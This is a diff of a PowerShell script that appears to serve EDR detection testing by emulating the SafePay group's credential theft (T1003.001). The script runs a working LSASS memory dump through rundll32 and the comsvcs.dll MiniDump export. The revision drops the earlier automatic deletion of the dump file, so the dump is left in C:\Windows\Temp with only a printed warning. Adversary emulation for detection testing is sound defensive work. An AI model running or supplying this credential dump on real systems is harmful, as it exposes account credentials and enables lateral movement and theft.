@@ -1,56 +1,51 @@
 <#
 .SYNOPSIS
-    SafePay LSASS Credential Dump - DETECTION TRIGGER
+    SafePay Credential Dump - DETECTION TRIGGER
 .DESCRIPTION
-    Dumps LSASS memory using comsvcs.dll MiniDump.
-    Will trigger EDR detection for T1003.001.
-    REQUIRES ADMIN PRIVILEGES.
+    Dumps LSASS via comsvcs.dll MiniDump.
     TTP: T1003, T1003.001
 #>
-Write-Host "[*] Starting SafePay Credential Dumping (T1003)" -ForegroundColor Cyan
-Write-Host "[*] This will trigger EDR detection for credential access" -ForegroundColor Yellow
+$ErrorActionPreference = "SilentlyContinue"
+Write-Host "[*] Starting SafePay Credential Dump (T1003)" -ForegroundColor Cyan
 
-try {
-    # Check if running as admin
-    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-    
-    if (-not $isAdmin) {
-        Write-Host "[!] WARNING: Not running as Administrator - LSASS dump will fail" -ForegroundColor Red
-    }
-    
-    # Get LSASS PID
-    $lsass = Get-Process lsass -ErrorAction SilentlyContinue
-    
-    if ($lsass) {
-        Write-Host "[*] LSASS Process ID: $($lsass.Id)" -ForegroundColor Yellow
-        
-        # Create temp directory for dump
-        $dumpPath = "$env:TEMP\lsass_rtl_test.dmp"
-        
-        Write-Host "[*] Executing: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $($lsass.Id) $dumpPath full"
-        
-        # ACTUAL DETECTION TRIGGER - This will attempt to dump LSASS
-        # CrowdStrike will likely block this but will generate a detection
-        $result = Start-Process -FilePath "rundll32.exe" -ArgumentList "C:\Windows\System32\comsvcs.dll, MiniDump $($lsass.Id) $dumpPath full" -Wait -PassThru -NoNewWindow -ErrorAction SilentlyContinue
-        
-        if (Test-Path $dumpPath) {
-            Write-Host "[+] SUCCESS: LSASS dump created at $dumpPath" -ForegroundColor Green
-            Write-Host "[!] Cleaning up dump file for safety..." -ForegroundColor Yellow
-            Remove-Item $dumpPath -Force -ErrorAction SilentlyContinue
-            Write-Host "[+] Dump file removed" -ForegroundColor Green
-        } else {
-            Write-Host "[-] Dump file not created - EDR likely blocked but detection should still trigger" -ForegroundColor Yellow
-        }
-        
-        Write-Host "[!] CrowdStrike should detect: 'LsassMemoryAccess' or 'CredentialDumping'" -ForegroundColor Magenta
-        
-    } else {
-        Write-Host "[!] LSASS process not found" -ForegroundColor Red
-    }
-    
-} catch {
-    Write-Host "[!] Error: $_" -ForegroundColor Red
-    Write-Host "[-] This is expected if EDR blocked the action" -ForegroundColor Yellow
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin) {
+    Write-Host "[!] WARNING: Not running as Administrator. LSASS dump will likely fail." -ForegroundColor Red
 }
 
-Write-Host "`n[*] Detection should appear in CrowdStrike within 1-2 minutes" -ForegroundColor Cyan
+# Step 1: Find LSASS
+Write-Host "`n[*] [T1003.001] Locating LSASS process..."
+$lsass = Get-Process lsass -ErrorAction SilentlyContinue
+if ($lsass) {
+    Write-Host "    [+] Found LSASS (PID: $($lsass.Id))" -ForegroundColor Green
+} else {
+    Write-Host "    [-] LSASS not found (Permission Denied?)" -ForegroundColor Red
+    exit
+}
+
+# Step 2: Dump via comsvcs.dll
+$dumpPath = "C:\Windows\Temp\lsass_safepay_$($lsass.Id).dmp"
+Write-Host "`n[*] [T1003.001] Dumping LSASS via comsvcs.dll MiniDump..."
+Write-Host "    CMD: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $($lsass.Id) $dumpPath full"
+try {
+    $proc = Start-Process -FilePath "rundll32.exe" -ArgumentList "C:\Windows\System32\comsvcs.dll, MiniDump $($lsass.Id) $dumpPath full" -PassThru -Wait -ErrorAction Stop
+    Start-Sleep -Seconds 2
+    
+    if (Test-Path $dumpPath) {
+        $size = (Get-Item $dumpPath).Length
+        Write-Host "    [+] LSASS dump created: $dumpPath ($size bytes)" -ForegroundColor Green
+        Write-Host "    [!] CRITICAL: Delete this file immediately after testing!" -ForegroundColor Red
+    } else {
+        Write-Host "    [-] Dump file not created (EDR likely blocked)" -ForegroundColor Yellow
+    }
+} catch {
+    Write-Host "    [-] Dump failed: $_" -ForegroundColor Red
+}
+
+# Step 3: Alternative - Task Manager method (detection trigger)
+Write-Host "`n[*] [T1003.001] Triggering procdump-style detection..."
+Write-Host "    CMD: tasklist /fi `"imagename eq lsass.exe`" /v"
+tasklist /fi "imagename eq lsass.exe" /v 2>&1 | ForEach-Object { Write-Host "    $_" }
+
+Write-Host "`n[+] Credential Dump Complete." -ForegroundColor Green
+Write-Host "[!] Check EDR for: comsvcs.dll MiniDump, LSASS access, rundll32 suspicious args" -ForegroundColor Magenta
